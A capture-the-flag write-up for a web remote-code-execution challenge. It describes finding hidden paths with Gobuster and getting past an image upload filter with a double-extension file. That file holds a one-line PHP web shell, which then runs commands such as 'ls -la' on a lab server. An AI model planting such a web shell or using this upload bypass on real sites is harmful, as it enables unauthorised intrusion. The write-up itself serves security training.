# C78 - RCE 1

## CATEGORY

Web - RCE

## Challenge

If the web application is suceptible to certain types of web attacks, there may be more to it. Find out if there are other ways to find information in the web application.

The flag will appear in the following format: HTX{String}

## Hint(s)

None used.

## Solution

We first run Gobuster on the original site, to get a path /vendor and /management. We use the /vendor path to upload a file named `abcd.jpg.php` which contains the php code `<?php system($_GET['cmd']);?>`.

This lets us bypass the image upload filter (which apparently only checks for the `.jpg` extension) as well as allow us to perform RCE wtih ls, cat and the likes appended to the end.

The final filepath of our RCE exploit is uploaded to `10.8.201.110/HTXIC/vendor/images/abcd.jpg.php` and we can run RCE code by adding a `?cmd=<command>` parameter at the end like this: `10.8.201.110/HTXIC/vendor/images/abcd.jpg.php?cmd=ls -la`, which allows us to find the flag by traversing the file system.

## Flag
